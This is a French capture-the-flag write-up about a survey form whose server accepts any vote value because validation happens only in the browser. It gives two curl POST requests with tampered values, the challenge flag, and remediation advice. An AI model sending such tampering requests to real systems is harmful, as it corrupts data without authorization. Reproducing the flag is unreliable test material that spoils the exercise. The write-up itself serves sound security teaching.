# Survey Value Tampering — Manipulation des valeurs du sondage

## Faille
Le formulaire de vote limite les valeurs de 1 à 10 côté client (balise `<select>`),
mais le serveur ne valide pas que la valeur reçue est dans cette plage. Le champ
hidden `sujet` est également modifiable.

## Catégorie OWASP
A04:2021 — Insecure Design

## Comment trouver la faille

1. La page `?page=survey` contient plusieurs formulaires de vote, chacun avec :
   - Un champ hidden `sujet` (valeur 2 à 6)
   - Un select `valeur` avec des options de 1 à 10
   - Le formulaire se soumet automatiquement via `onChange`

2. En inspectant le code source, on constate que la validation est uniquement
   côté client : les options du `<select>` limitent les choix de 1 à 10.

3. Via curl ou l'inspecteur, on peut envoyer n'importe quelle valeur.

## Exploitation

```bash
curl -X POST "http://<IP>/index.php?page=survey" \
  -d "sujet=2&valeur=999"
```

Le serveur accepte la valeur `999` sans vérification et affiche le flag.

On peut aussi modifier le champ `sujet` :
```bash
curl -X POST "http://<IP>/index.php?page=survey" \
  -d "sujet=42&valeur=999"
```

## Flag
`03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa`

## Comment corriger

1. **Valider toutes les entrées côté serveur** : vérifier que `valeur` est un entier
   compris entre 1 et 10, et que `sujet` correspond à un identifiant valide en base.
   ```php
   if ($valeur < 1 || $valeur > 10) {
       die("Valeur invalide");
   }
   ```

2. **Ne jamais faire confiance à la validation côté client** : les balises `<select>`,
   `maxlength`, `type="number"` sont des contraintes d'interface, pas de sécurité.
   Elles peuvent toutes être contournées via curl, Burp Suite ou l'inspecteur.

3. **Utiliser des tokens CSRF** pour empêcher la soumission automatisée de formulaires.

4. **Limiter le rate** des soumissions pour empêcher le spam de votes.
